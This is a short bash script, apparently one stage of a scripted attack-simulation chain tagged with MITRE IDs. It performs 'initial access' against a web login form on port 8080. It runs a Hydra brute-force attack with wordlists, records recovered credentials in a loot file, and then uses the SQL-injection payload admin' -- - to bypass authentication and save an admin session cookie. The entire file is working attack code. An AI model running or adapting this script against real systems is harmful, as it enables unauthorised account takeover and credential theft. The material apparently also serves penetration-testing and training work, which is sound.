#!/bin/bash
# Stage 2 — Initial Access
#   (a) Credential brute force on the login form  (MITRE T1110)
#   (b) SQL-injection auth bypass to establish a session (MITRE T1190)
source "$(dirname "$0")/lib.sh"
banner "STAGE 2 — INITIAL ACCESS (T1110 brute force / T1190 SQLi)"

WL="$(dirname "$0")/wordlists"

log "(a) Hydra brute force against /login ..."
hydra -L "$WL/users.txt" -P "$WL/passwords.txt" -f -o "$LOOT/02-hydra.txt" \
      -s 8080 "$TARGET_HOST" http-post-form \
      "/login:username=^USER^&password=^PASS^:Invalid credentials" 2>&1 | tail -8 || true
if grep -q "login:" "$LOOT/02-hydra.txt" 2>/dev/null; then
  ok "Brute force recovered credentials:"
  grep "login:" "$LOOT/02-hydra.txt"
fi

echo
log "(b) SQL-injection auth bypass ( username = admin' -- - ) ..."
if sqli_login; then
  ok "Auth bypass succeeded — admin session established (no valid password used)"
  ok "Session cookie saved to $COOKIE"
else
  err "SQLi login failed"; exit 1
fi
